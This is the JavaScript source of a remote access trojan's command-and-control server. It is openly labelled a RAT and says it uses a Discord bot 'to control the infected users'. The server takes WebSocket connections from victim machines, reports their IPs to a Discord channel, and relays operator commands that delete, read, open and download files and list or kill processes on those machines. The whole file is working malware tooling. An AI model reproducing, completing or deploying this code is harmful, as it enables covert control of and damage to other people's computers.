//Made by - @Karewen
//Version - 1.0

//RAT version
const version = "1.0f"

//Server Variables
const WebSocket = require("ws");

const wss = new WebSocket.Server({ port: 443 });

//Discord.JS to control the infected users
const Discord = require("discord.js");

const client = new Discord.Client({
  ws: {
    intents: [
      "GUILDS",
      "GUILD_MESSAGES",
      "GUILD_MEMBERS",
      "GUILD_MESSAGE_REACTIONS",
      "GUILD_PRESENCES",
      "DIRECT_MESSAGES",
      "DIRECT_MESSAGE_REACTIONS",
    ],
  },
});

let status = "offline"

client.on("error", error => {
  console.log("An error occured.")
})

client.on("ready", () => {
  status = "online"
  console.log("> Server is online!")
})

client.login(process.env.TOKEN);

let ip;
let connected_ips = [];

let timestamp;

let sockets = [];

//Connection create

waitForBot().then(() => {

  wss.on("connection", async function (socket) {
    sockets.push(socket)

    try {
      socket.on("message", (message) => {

        message = message.toString();

        if (message.startsWith("IP:")) {
          ip = message.split(" ")[1];
          let vx = message.split(" ")[3]

          socket.ip = ip;

          if (vx !== version){
            connected_ips.push(ip)
            socket.send("FORBIDDEN")
            
            return socket.close();

          } else if (connected_ips.includes(ip)) {
            connected_ips.push(ip)
            socket.send("FORBIDDEN")
            
            return socket.close();

          } else {
              connected_ips.push(ip);
              socket.send("OK")

              message = `\`\`\`${ip} : CONNECTED\`\`\``;
              client.channels.cache.get("833728968116666449").send(message)

          }

        } else if (message.startsWith("Pong!")) {
            let now = new Date().getTime();

            message = `\`\`\`${socket.ip} : Pong! ${now - timestamp}ms\`\`\``;
            client.channels.cache.get("833728968116666449").send(message)

        } else {
            message = `\`\`\`${socket.ip} : ${message}\`\`\``;
            client.channels.cache.get("833728968116666449").send(message)

        }
      });

      socket.on("close", () => {
        connected_ips.splice(connected_ips.indexOf(socket.ip), 1);

        sockets.splice(sockets.indexOf(socket), 1)

        client.channels.cache
          .get("833728968116666449")
          .send(`\`\`\`${socket.ip} : DISCONNECTED\`\`\``);
      });
      
    } catch (e) {
      client.channels.cache.get("833728968116666449").send(`\`\`\`${e}\`\`\``);

    }
  });
});

//Bot controls

client.on("message", async (message) => {
  if (message.author.id === client.user.id) return;

  let prefix = ">";

  let messageArray = message.content.split(" ");

  let command = messageArray[0].split(">")[1];
  let args = messageArray.slice(1);

  if (command && sockets.length < 1){
    return message.channel.send("No clients are connected.")

  }

  if (command === "ping") {
    //>ping x.x.x.x

    timestamp = new Date().getTime();

    let data = args.join(" ");

    if (data.split(" ").length > 1)
      message.channel.send("Only one argument is accepted!");

    if (!connected_ips.includes(data.split(" ")[0]) && data.split(" ")[0] !== "") {
      message.channel.send("The IP address provided was invalid.");

    } else {
      if(data.split(" ")[0] === ""){

        sockets.forEach(socket => {
          socket.send(command);
          socket.send(data);

        })

      } else {
        let socket = sockets.filter(sock => sock.ip === data.split(" ")[0])[0]
        
        socket.send(command);
        socket.send(data);
      }
    }
  }

  if(command === "pn"){
    //>pn x.x.x.x

    let data = args.join(" ");

    if (data.split(" ").length > 1)
      message.channel.send("Only one argument is accepted!");

    if (!connected_ips.includes(data.split(" ")[0])) {
      message.channel.send("The IP address provided was invalid.");

    } else {
      let socket = sockets.filter(sock => sock.ip === data.split(" ")[0])[0]
        
      socket.send(command);
      socket.send(data);
    }
  }

  if (command === "cd") {
    //>cd x.x.x.x <path>

    let data = args.join(" ");

    if (!connected_ips.includes(data.split(" ")[0])) {
      message.channel.send("The IP address provided was invalid.");

    } else {
      let socket = sockets.filter(sock => sock.ip === data.split(" ")[0])[0]
        
      socket.send(command);
      socket.send(data);
    }
  }

  if (command === "df") {
    //>df x.x.x.x <path_to_file>

    let data = args.join(" ");

    if (!connected_ips.includes(data.split(" ")[0])) {
      message.channel.send("The IP address provided was invalid.");

    } else {
      let socket = sockets.filter(sock => sock.ip === data.split(" ")[0])[0]
        
      socket.send(command);
      socket.send(data);

    }
  }

  if (command === "sf") {
    //>sf x.x.x.x <url> <path_to_file>

    let data = args.join(" ");

    if (!connected_ips.includes(data.split(" ")[0])) {
      message.channel.send("The IP address provided was invalid.");
      
    } else if (data.split(" ")[1].toString().match("^(http://www.|https://www.|http://|https://)?[a-z0-9]+([-.]{1}[a-z0-9]+)*.[a-z]{2,5}(:[0-9]{1,5})?(/.*)?$") === null || data.split(" ")[1].toString().match("^(http://www.|https://www.|http://|https://)?[a-z0-9]+([-.]{1}[a-z0-9]+)*.[a-z]{2,5}(:[0-9]{1,5})?(/.*)?$").length < 1) {

      message.channel.send(
        "Provide a valid url to a file to download."
      );

    } else {
      let socket = sockets.filter(sock => sock.ip === data.split(" ")[0])[0]
        
      socket.send(command);
      socket.send(data);
    }
  }

  if (command === "rf") {
    //>rf x.x.x.x <path_to_file>

    let data = args.join(" ")

    if (!connected_ips.includes(data.split(" ")[0])) {
      message.channel.send("The IP address provided was invalid.");
    
    } else {
      let socket = sockets.filter(sock => sock.ip === data.split(" ")[0])[0]
        
      socket.send(command);
      socket.send(data);
    }
  }

  if (command === "of") {
    //>of x.x.x.x <path_to_file>

    let data = args.join(" ");

    if (!connected_ips.includes(data.split(" ")[0])) {
      message.channel.send("The IP address provided was invalid.");

    } else {
      let socket = sockets.filter(sock => sock.ip === data.split(" ")[0])[0]
        
      socket.send(command);
      socket.send(data);
    }
  }

  if (command === "lp") {
    //>lp x.x.x.x

    let data = args.join(" ")

    if (data.split(" ").length > 1)
      return message.channel.send("Only one argument is accepted!");

    if (!connected_ips.includes(data.split(" ")[0])) {
      message.channel.send("The IP address provided was invalid.");

    } else {
      let socket = sockets.filter(sock => sock.ip === data.split(" ")[0])[0]
        
      socket.send(command);
      socket.send(data);
    }
  }

  if (command === "cp") {
    //>cp x.x.x.x <pid>

    let data = args.join(" ")

    if (data.split(" ").length > 2)
      return message.channel.send("Only two arguments are accepted!");

    if (!connected_ips.includes(data.split(" ")[0])) {
      return message.channel.send("The IP address provided was invalid.");

    } else {
      let socket = sockets.filter(sock => sock.ip === data.split(" ")[0])[0]
        
      socket.send(command);
      socket.send(data);
    }
  }
});

function waitForBot(){
  return new Promise((resolve, reject) => {
    let interval = setInterval(() => {
      if (status === "offline") return;

      clearInterval(interval)
      resolve("Bot is now online")
    }, 100);
  });
};
